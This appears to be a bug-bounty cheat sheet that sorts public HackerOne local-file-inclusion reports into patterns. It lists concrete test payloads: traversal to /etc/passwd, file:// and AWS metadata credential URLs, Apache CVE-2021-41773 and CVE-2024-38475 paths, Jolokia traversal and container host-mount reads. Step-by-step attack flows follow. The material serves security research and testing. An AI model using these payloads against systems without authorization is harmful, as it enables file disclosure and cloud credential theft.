# Real HackerOne LFI Report Patterns

## Pattern Analysis from Top 40 Reports

### Pattern 1: PDF/Export Template Injection
**Reports**: Visma $500 (H1 809819), PortSwigger $0 (H1 2424815)
**Mechanism**: HTML injection in PDF export → template param allows file inclusion
**Test**: `?template=../../../etc/passwd`, `?file=../../../etc/passwd`
**Why it works**: PDF generators often load template files from user-controlled paths

### Pattern 2: SSRF → LFI Chaining
**Reports**: Evernote $0 (H1 1189367), Semrush $0 (H1 794099)
**Mechanism**: Application makes HTTP requests to user-controlled URLs → can use file:// protocol
**Test**: `?url=file:///etc/passwd`, `?url=http://169.254.169.254/latest/meta-data/`
**Why it works**: SSRF allows access to internal resources and local files via file://

### Pattern 3: CMS Plugin Path Traversal
**Reports**: Grafana $1,000 (H1 1415820), Vanilla Forums $900 (H1 411140), PortSwigger $0 (H1 2424815)
**Mechanism**: Plugin/component paths not properly sanitized
**Test**: `/public/plugins/../../../etc/passwd`
**Why it works**: Plugin directory structures create trust in paths

### Pattern 4: Container/Host Escape
**Reports**: Semmle $2,000+$2,000 (H1 694181, 697055)
**Mechanism**: Application running in container but reading files from host mount
**Test**: `../../../hostfs/etc/passwd`, `../../../hostfs/proc/1/environ`
**Why it works**: Containers often mount host filesystem for monitoring

### Pattern 5: Path Traversal in File Operations
**Reports**: Keybase $5,000 (H1 713006), Starbucks $0 (H1 876295, 780021)
**Mechanism**: File download/attachment functionality uses filename from user input
**Test**: Modify filename parameter to include `../`
**Why it works**: Applications trust filenames without normalizing paths

### Pattern 6: JMX/Jolokia LFI
**Reports**: DoD $0 (H1 2778380)
**Mechanism**: Jolokia JMX endpoint uses `!` as path separator
**Test**: `/jolokia/exec/!..!..!..!..!etc!passwd`
**Why it works**: Jolokia interprets `!` as / and traversal is possible

### Pattern 7: Apache Path Traversal (CVE-2021-41773/42013)
**Reports**: IBB $4,000 (H1 1394916)
**Mechanism**: Apache HTTP Server 2.4.49 path normalization bypass
**Test**: `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
**Why it works**: Apache's normalization doesn't handle encoded dots

### Pattern 8: Apache mod_rewrite Weakness (CVE-2024-38475)
**Reports**: IBB $4,920 (H1 2585378)
**Mechanism**: mod_rewrite + mod_proxy allows path traversal via encoded ?
**Test**: `/path%3F../../../../etc/passwd`

### Pattern 9: Nginx Alias Misconfiguration
**Reports**: Multiple disclosures
**Mechanism**: nginx alias directive without trailing slash leads to traversal
**Test**: `/files../etc/passwd`, `/static../etc/passwd`
**Pattern**: `location /files { alias /var/www/files; }` → `/files../etc/passwd`

### Pattern 10: Package/Archive Extraction
**Reports**: WordPress $0 (H1 205481), GitLab $12,000 (H1 822262, 733072)
**Mechanism**: Zip/tar extraction doesn't sanitize paths inside archive
**Test**: Upload zip with symlinks or `../` paths
**Why it works**: "Zip Slip" pattern — archive entries with directory traversal

### Pattern 11: Mobile Deeplink Traversal
**Reports**: TikTok $0 (H1 2417516), Basecamp $0 (H1 2553411)
**Mechanism**: Mobile app deeplink handlers allow file:// protocol
**Test**: `app://open?url=file:///etc/passwd`
**Why it works**: Deeplinks trust incoming URIs without validation

### Pattern 12: XXE → LFI
**Reports**: Rockstar Games $1,500 (H1 347139)
**Mechanism**: XML External Entity injection includes local files
**Test**: XXE payload with `file:///etc/passwd`
**Why it works**: XML parser resolves external entities without restriction

## Attack Flow from Real Reports

### Visma $500 (H1 809819) — HTML injection in PDF export → LFI
```
1. Find PDF export feature at /export?format=pdf
2. Test template parameter: /export?format=pdf&template=../../../etc/passwd
3. PDF includes /etc/passwd content
4. Impact: Read local files via PDF generation
```

### Evernote $0 (H1 1189367) — SSRF + LFI → AWS metadata
```
1. Find SSRF endpoint that fetches URLs
2. Test file:// protocol: ?url=file:///etc/passwd
3. Confirm LFI works
4. Read AWS metadata: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
5. Impact: Cloud credential theft
```

### Semmle $2,000 (H1 694181) — Container escape LFI
```
1. Find LFI in containerized environment
2. Test: /path?read=../../../hostfs/etc/passwd
3. Read host /etc/passwd from within container
4. Escalate: Read /hostfs/proc/1/environ for host env vars
5. Impact: Container escape → full host compromise
```

### GitLab $12,000 (H1 733072) — Path traversal → RCE
```
1. Find NuGet package registry endpoint
2. Test path traversal in package download
3. Combine with file write capability
4. Achieve RCE
5. Impact: Full server compromise
```

### Apache CVE-2021-41773 $4,000 (H1 1394916)
```
1. Identify Apache 2.4.49
2. Use the encoded dot bypass
3. Read /etc/passwd
4. Impact: Unauthenticated file read
```

### Grafana $1,000 (H1 1415820) — CVE-2021-43798
```
1. Find Grafana 8.x
2. Test plugin path: /public/plugins/text/../../../../../../../../etc/passwd
3. Confirm unauthenticated LFI
4. Impact: Sensitive file disclosure
```

### Jolokia LFI (H1 2778380) — Unauthenticated
```
1. Find /jolokia endpoint
2. Test exec with ! delimiter
3. Read files via JBoss JMX
4. Impact: Unauthenticated LFI
```
